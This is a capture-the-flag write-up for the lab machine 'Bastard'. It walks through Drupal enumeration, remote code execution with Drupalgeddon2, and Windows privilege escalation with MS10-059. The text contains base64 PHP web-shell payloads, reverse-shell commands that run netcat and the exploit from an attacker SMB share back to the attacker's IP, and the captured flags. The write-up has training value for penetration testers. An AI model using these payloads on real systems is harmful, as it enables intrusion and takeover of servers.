# Bastard
>Author : Xyan1d3
>Date : 28th June 2021
>IP : 10.10.10.9
>OS : Windows
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Mon Jun 28 18:41:26 2021 as: nmap -sC -sV -oN nmap/bastard -v 10.10.10.9
Nmap scan report for bastard.htb (10.10.10.9)
Host is up (0.080s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see that we have port `80/tcp` open which `nmap` says that it runs `drupal 7`.
At, This time the latest drupal version is `9.2.0`.
![[Pasted image 20210628185230.png]]

## Web Enumeration
We could run `drupwn` which is a drupal enumeration tool.
On running drupal the thing which actually sticks out is the drupal version which is `7.54`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/bastard]
└──╼ # drupwn --target http://10.10.10.9 --mode enum

        ____
       / __ \_______  ______ _      ______
      / / / / ___/ / / / __ \ | /| / / __ \
     / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
    /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                     /_/
    
[-] Version not specified, trying to identify it

[+] Version detected: 7.54


============ Nodes ============

http://10.10.10.9/node/1

*** SNIP ***
```

We could look for any potential exploits of this `drupal` version.

## Web Enumeration
On googling we find out that it is vulnerable to `drupalgeddon2` exploit which results in a `URCE`.
Exploit Link : https://github.com/dreadlocked/Drupalgeddon2/blob/master/drupalgeddon2.rb

This exploit contains some basic checks of trying to get a reverse shell. But, The commands are for linux but, We are up against a Windows Target.
The exploit also has a beautiful feature that if all the ways of command execution fails it will drop down to a command based shell.

So, We run the exploit with `ruby drupalgeddon2.rb http://10.10.10.9`.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.11]─[~/htb/bastard/Drupalgeddon2]
└──╼ # ruby drupalgeddon2.rb http://10.10.10.9
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
--------------------------------------------------------------------------------
[+] Found  : http://10.10.10.9/CHANGELOG.txt    (HTTP Response: 200)
[+] Drupal!: v7.54    
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
[*] Testing: Form   (user/password)
[+] Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Clean URLs
[+] Result : Clean URLs enabled
--------------------------------------------------------------------------------
[*] Testing: Code Execution   (Method: name)
[i] Payload: echo WJUPVCOL
[+] Result : WJUPVCOL
[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
--------------------------------------------------------------------------------
[*] Testing: Existing file   (http://10.10.10.9/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (./)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/)
[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Existing file   (http://10.10.10.9/sites/default/files/shell.php)
[i] Response: HTTP 404 // Size: 12
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[*] Testing: Writing To Web Root   (sites/default/files/)
[*] Moving : ./sites/default/files/.htaccess
[i] Payload: mv -f sites/default/files/.htaccess sites/default/files/.htaccess-bak; echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee sites/default/files/shell.php
[!] Target is NOT exploitable [2-4] (HTTP Response: 404)...   Might not have write access?
[!] FAILED : Couldn't find a writeable web path
--------------------------------------------------------------------------------
[*] Dropping back to direct OS commands 
drupalgeddon2>> whoami    <---- The Point of direct command execution
nt authority\iusr
```

# Initial FootHold
We create a put the `nc64.exe` inside a `www` directory and host it via the `smbserver.py`. So, That we could directly execute the `netcat` binary from the smbshare without touching the disk.

![[Pasted image 20210628221459.png]]

## Getting user.txt
We could now get the `user.txt` from the `C:\Users\dimitris\Desktop\user.txt`.
```python
C:\Users\dimitris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

 Directory of C:\Users\dimitris\Desktop

19/03/2017  09:04     <DIR>          .
19/03/2017  09:04     <DIR>          ..
19/03/2017  09:06                 32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  30.806.962.176 bytes free

C:\Users\dimitris\Desktop>type user.txt
type user.txt
ba22fde1932d06eb76a163d312f921a2
```

# Root Escalation
We have to look at the OS information by doing a `systeminfo` command.
```python
C:\Users\dimitris\Desktop>systeminfo
systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00496-001-0001283-84782
Original Install Date:     18/3/2017, 7:04:46 
System Boot Time:          28/6/2021, 4:08:02 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
```

The OS Running here is `Microsoft Windows Server 2008 R2 Datacenter` 64-Bit.

Here, We will be exploiting the `MS10-059.exe` or `chimmichuri` exploit.
Exploit Link : https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe

The exploit takes `ATTACKER-IP` & `ATTACKER-PORT` as command line arguments and sends the elevated shell back to us.

Exploit command : `\\10.10.14.11\magisk\ms10-059.exe 10.10.14.11 8888`
It sends a elevated reverse shell on `8888/tcp` on listening with netcat.
![[Pasted image 20210628231409.png]]

## Root Flag
We could now, grab the `root.txt` from the `C:\Users\Administrator\Desktop`.
```python
C:\inetpub\drupal-7.54>cd C:\Users\Administrator\Desktop\
cd C:\Users\Administrator\Desktop\

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 605B-4AAA

 Directory of C:\Users\Administrator\Desktop

19/03/2017  08:33     <DIR>          .
19/03/2017  08:33     <DIR>          ..
19/03/2017  08:34                 32 root.txt.txt
               1 File(s)             32 bytes
               2 Dir(s)  30.806.953.984 bytes free

C:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
4bf12b963da1b30cc93496f617f7ba7c
```